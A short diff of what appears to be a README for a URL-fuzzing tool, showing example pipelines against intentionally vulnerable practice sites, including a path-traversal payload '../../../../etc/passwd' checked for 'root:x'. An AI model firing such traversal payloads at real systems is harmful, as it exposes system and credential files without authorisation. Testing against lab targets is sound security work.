@@ -31,11 +31,12 @@ echo http://testphp.vulnweb.com/ | waybackurls | grep "=" | egrep -iv ".(jpg|jpe
 ```
 
 /etc/passwd
-> Example to find /etc/passwd, one one url 
+> Example to find /etc/passwd, on one url 
 
 ```
 echo "https://0aa9003403a40852c028b1270079009b.web-security-academy.net/image?filename=" | qsreplace "../../../../etc/passwd" | findit -c "root:x"
 ```
+
 
 ![image](https://user-images.githubusercontent.com/5285547/178974785-cbbab50c-bd6e-4a4e-ae7d-822ba3ca46f6.png)
 
